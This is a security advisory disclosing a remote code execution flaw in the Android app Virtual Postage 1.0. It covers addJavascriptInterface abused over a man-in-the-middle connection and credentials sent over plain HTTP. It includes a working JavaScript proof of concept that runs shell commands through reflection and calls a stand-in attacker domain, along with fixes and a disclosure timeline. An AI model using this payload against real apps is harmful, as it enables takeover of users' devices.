# Exploit Title: Virtual Postage (VPA) - Remote Code Execution via MITM
# Date: 20/Jul/17
# Exploit Author: MaXe
# Vendor Homepage: https://play.google.com/store/apps/details?id=a2.virtualpostage.com [http://archive.is/EdtJT]
# Software Link: N/A
# Screenshot: N/A
# Version: 1.0
# Tested on: Android 4.1.0 (Google APIs) - API Level 16 - x86
# CVE : N/A

 Virtual Postage (VPA) - Remote Code Execution via MITM

Version affected: 1.0

App Info: The Android application reviewed allows a user to calculate how much postage will cost.

External Links: 
https://play.google.com/store/apps/details?id=a2.virtualpostage.com [http://archive.is/EdtJT]


Credits: MaXe (@InterN0T) 

Special Thanks: Geoff Ellis for also identifying credentials being sent over HTTP GET requests before InterN0T did: 
https://www.linkedin.com/pulse/insecure-mobile-application-programming-practices-case-geoff-ellis [http://archive.is/LvSeb]
Reference: "String str2 = "http://www.virtualpostage.com.au/auth.asp?Username=" + stringUtils.Encodeproton-Url(mostCurrent._edittext1.getText(), "UTF8") + "&Password=" + stringUtils.Encodeproton-Url(mostCurrent._edittext2.getText(), "UTF8");"

Shouts: SubHacker and the rest of the awesome infosec community.


-:: The Advisory ::-
The Android application is vulnerable to Remote Code Execution via Man-In-The-Middle (MITM) attacks. 
This is caused by the following lines of code within the \a2\virtualpostage\com\main.java file: (Lines 442 - 448)

            StringUtils stringUtils = new StringUtils();
            String str2 = "http://www.virtualpostage.com.au/auth.asp?Username=" + stringUtils.EncodeUrl(mostCurrent._edittext1.getText(), "UTF8") + "&Password=" + stringUtils.EncodeUrl(mostCurrent._edittext2.getText(), "UTF8");
            WebViewExtras webViewExtras = mostCurrent._webviewextras1;
            WebViewExtras.addJavascriptInterface(mostCurrent.activityBA, (WebView) mostCurrent._webview1.getObject(), "B4A");
            mostCurrent._webview1.LoadUrl(str2);
            mostCurrent._t.Initialize(processBA, "LOGGINGIN", 15000);
            mostCurrent._t.setEnabled(true);


In addition to the above, the following App configuration also aids in the exploitability of this issue: (File: AndroidManifest.xml)
    <uses-sdk android:minSdkVersion="5" android:targetSdkVersion="14" />

If an attacker performs a MITM attack against "www.virtualpostage.com.au" by e.g. hijacking the domain name, DNS, IP prefix, or by 
serving a malicious wireless access point (or hijacking a legitimate one), or by hacking the server at "www.virtualpostage.com.au", 
then the attacker can instruct the Android application to execute attacker controlled Java code that the phone will execute in the 
context of the application.

The root cause of this vulnerability is caused by addJavascriptInterface() within the WebViewer, which in older API versions can be 
used to execute arbitrary Java code by using reflection to access public methods with attacker provided JavaScript.


-:: Proof of Concept ::-
A successful attack that makes "www.virtualpostage.com.au" serve the following code:
<script>
  function execute(cmd){
    return B4A.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmd);
  }
  execute(['/system/bin/sh', '-c', 'echo InterN0T was here > /data/data/a2.virtualpostage.com/owned']);
  execute(['/system/bin/sh', '-c', 'am start -a android.intent.action.VIEW -d "http://attacker-domain.tld/video.mp4"']);
  </script>
  This application has been owned.

Will make the Android application create a new file in the App directory named: owned, and also play a video chosen by the attacker as an example.

Instead of creating a new file, the attacker can also use the "drozer" payload for example. Refer to the references further below.

The vulnerable HTTP request is triggered when a user attempts to log in with any set of credentials.


-:: Solution ::-
The Android app code should not use the addJavaScriptInterface() function. Instead the following code should be used:
    WebView webView = new WebView(this);
    setContentView(webView);
    ...
Alternatively, the application manifest should specify API levels JELLY_BEAN_MR1 and above as follows:
    <manifest>
    <uses-sdk android:minSdkVersion="17" />
    ...
    </manifest>

The URL used ("http://www.virtualpostage.com.au") should ALSO use HTTPS (and verify the hostname and certificate properly).

Last but not least, the following code can also be used to determine whether the addJavascriptInterface should be enabled or not:
    private void exposeJsInterface() {
        if (VERSION.SDK_INT < 17) {
            Log.i(TAG, "addJavascriptInterface() bridge disabled.");
        } else {
            addJavascriptInterface(Object, "EVENT_NAME_HERE");
        }
    }

In relation to the credentials being sent over plain-text HTTP GET requests, the following are the most basic recommendations to be implemented:
- All URLS within the application must utilize HTTPS.
- Certificate pinning should also be implemented.
- Usernames and passwords should not be sent over HTTP GET requests, HTTP POST requests should be used instead.


References:
http://50.56.33.56/blog/?p=314
https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)
https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/
https://labs.mwrinfosecurity.com/advisories/webview-addjavascriptinterface-remote-code-execution/
https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=129859614

Filename: a2.virtualpostage.com_manual.apk
File size: 304,307 bytes

md5: 1da27e27eb8447ab489eb1aae3cd14f6
sha1: f67a2c1f55879024c5ecd1194e6704a4286ea021
sha256: 0813eb25d08d877af66c8570153580da2c1df3fb873270422dca6be8dbe98932

App Name: VPA
Package Name: a2.virtualpostage.com 
Package Version: 1.0


Disclosure Timeline:
- 20Jul17: Vendor is informed about advisories.
- 20Jul17: Vendor responds: https://ghostbin.com/paste/jrt2e#L28
- 20Jul17: InterN0T email to vendor: https://ghostbin.com/paste/zjcam
- 20Jul17: Vendor responds: https://ghostbin.com/paste/vzv3y
- 20Jul17: Advisory released to the public.

=== EOF ===